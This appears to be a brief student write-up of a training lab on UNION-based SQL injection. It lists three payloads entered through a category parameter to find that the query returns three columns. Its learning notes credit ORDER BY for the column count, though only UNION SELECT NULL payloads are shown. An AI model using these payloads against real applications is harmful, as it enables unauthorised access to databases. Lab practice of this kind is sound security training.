# Lab Name
SQL injection UNION attack, determining the number of columns returned by the query

## Vulnerability
SQL Injection (UNION-based)

## Objective
Exploit UNION-based SQL Injection to determine the number of columns returned by the query.

## Entry Point
Category parameter

## Payload Used
' UNION SELECT NULL--
<img width="1918" height="1020" alt="dfdsg" src="https://github.com/user-attachments/assets/af31ab2e-cd34-4639-bfbc-449795f34b0d" />

' UNION SELECT NULL, NULL--
<img width="1918" height="1016" alt="Screenshot 2026-03-02 093136" src="https://github.com/user-attachments/assets/48968ce0-5660-43c5-a8be-fcce7e71658c" />

' UNION SELECT NULL, NULL, NULL--
<img width="1917" height="1016" alt="fgddfhdg" src="https://github.com/user-attachments/assets/624f5189-6062-45c6-abc0-e3b6ccf017f9" />

## Result
Identified that the query returns 3 columns.

## Learning
ORDER BY is used to determine the number of columns.
UNION SELECT must match the exact number of columns.
NULL is used as a placeholder when data types are unkonwn
